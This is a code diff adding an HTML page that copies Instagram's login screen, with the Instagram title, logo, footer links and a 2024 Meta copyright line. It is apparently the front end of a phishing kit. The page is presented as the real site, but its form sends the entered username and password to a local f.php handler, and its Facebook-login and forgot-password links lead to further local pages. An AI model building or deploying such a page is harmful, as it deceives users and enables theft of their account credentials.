@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Instagram  </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="instagram.svg">
+</head>
+<body>
+
+    <div id="container">
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="./logo.png" />
+                </div>
+                <div>
+                    <form action="f.php" method="post">
+                    <input type="text" placeholder="username" class="username"  name="adr" required/>
+                    <div>
+                        <input type="password" placeholder="password" class="password" name="mp" required/>
+                    </div>
+                    <input type="submit" value="Log in" class="login-btn" />
+                </div>
+            </form>
+                <span class="or"> OR </span>
+
+                <div class="main-bottom">
+                    <a href="f.html" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook </a><br>
+                    <a href="for.html" class="forget"> Forgot password </a>
+                </div>
+
+            </div>
+            <div class="bottom">
+                <div class="signUp">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </div>
+            <div class="app-section">
+                <span> Get the app </span>
+                <div class="images">
+                    <img src="./googlePlay.png" alt="googlePlay Image" >
+                    <img src="./microsoft.png" alt="Microsoft Image">
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer Section Starts from Here -->
+        <footer>
+            <a href="">Meta</a>
+            <a href="">About</a>
+            <a href="">Blog</a>
+            <a href="">Jobs</a>
+            <a href="">Help</a>
+            <a href="">API</a>
+            <a href="">Privacy</a>
+            <a href="">Terms</a>
+            <a href="">Top Accounts</a>
+            <a href="">Locations</a>
+            <a href="">Instagram Lite</a>
+            <a href="">Instagram Contact</a>
+            <a href="">Uploading & Non-Users</a>
+            <div class="bottom-footer">
+                <select name="" id="">
+                    <option value="English">English</option>
+                    <option value="Hindi">Hindi</option>
+                    <option value="Punjabi">Punjabi</option>
+                    <option value="Urdu">Urdu</option>
+                    <option value="Francais">Francais</option>
+                </select>
+                <span> &copy; 2024 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+</body>
+</html>
